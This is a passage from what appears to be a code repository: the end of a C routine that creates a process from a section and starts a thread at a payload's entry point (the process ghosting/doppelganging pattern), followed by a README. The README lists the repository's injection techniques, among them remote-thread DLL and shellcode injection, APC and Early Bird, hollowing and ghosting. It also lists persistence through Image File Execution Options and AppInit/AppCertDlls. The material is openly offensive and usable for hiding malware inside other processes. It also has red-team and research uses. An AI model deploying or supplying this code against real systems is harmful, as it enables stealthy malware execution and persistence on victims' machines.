    NTSTATUS status = fnNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    if (status != 0) {
        printf("Failed in NtCreateProcessEx Error Code 0x%x\n ", GetLastError());
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            printf("[!] Failed The payload has mismatching bitness\n ");
        }
        return -1;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pi, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);
    if (status != 0) {
        printf("Failed in NtQueryInformationProcess Error Code 0x%x\n ", GetLastError());
        return -1;
    }

   
    PEBmy* PebCopy = ReadRemotePEB(hProcess);

    ULONGLONG imageBase = (ULONGLONG)PebCopy->ImageBaseAddress;
    DWORD payloadEntryPointRVA = GetEntryPointRVA(PayloadData);
    ULONGLONG procEntry = payloadEntryPointRVA + imageBase;
    

    if (SetProcessParametar(hProcess, pi, TargetProcessName) == -1) {
        printf("Failed in setuping Parameters Error Code 0x%x\n ", GetLastError());
        return -1;
    }
    
    status = fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)procEntry, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0) {
        printf("Failed in NtCreateThreadEx %x  Error Code 0x%x   %x\n ", hThread,GetLastError(), status);
        return -1;
    }

    return 0;
}
```

`README.md`:

```md
# Process-Injection-Techniques

This is the C implementation of Diffrent Process Injection Technique.

```
Usage: Process_Injection_Techniques.exe

This wil print the injection techniques that is implemented and how to use them
```



***Techniques that i will cover here:***

[x] Inject Dll in remtote process using **CreateRemoteThread** API.

[x] Inject Dll in remtote process using **SetWindowsHookExW** API.

[x] Inject ShellCode in remtote process using **CreateRemoteThread** API.

[x] Inject ShellCode in remote process using **QueueUserAPC** API.

[x] Inject ShellCode in remote process using **Early Bird** Technique.

[x] Inject ShellCode in remote process using **TLS CallBack** Technique.

[x] Inject using **Thread execution hijacking**.

[x] Inject Dll in remtote process using **Reflective DLL injection**.

[x] inject using **Process Hollowing**.

[x] inject using **Process Doppelganging**.

[ ] inject using **Atom Bombing**.

[x] inject using **Process Ghosting**.

[x] inject and persist using **Image File Execution Options**.

[x] inject using using **AppInit_DLLs** Registry.

[x] inject using using **AppCertDlls** Registry.


```
NOTE:
- In Process Hollowing Injection technique, it Crashes With Some 64bit process like System32\svchost.exe,... 
- In Process Ghosting injecting 32bit in 32bit work only on 32bit version of windows.
- In Reflective DLL injection The Dll To inject should Depend only on Kernel32.dll and ntdll.dll for stability, as they are loaded at the same base address for all processes on the system, See Refrence[6] in the README for more info
- In case Process Doppelganging it does not work on windows 10 can't start the main thread return STATUS_ACCESS_DENIED But work fine on windows 8.1 and 7

if you Know the Solution please for the Process Hollowing and Process Ghosting let me know on abdelaziz.zohdy@gmail.com.
```

# Refrence:
[1]https://skanthak.homepage.t-online.de/appcert.html

[2]https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack

[3]https://github.com/hasherezade/process_ghosting

[4]https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/

[5]https://github.com/stephenfewer/ReflectiveDLLInjection

[6]http://www.nynaeve.net/?p=198

[7]https://www.ired.team/
```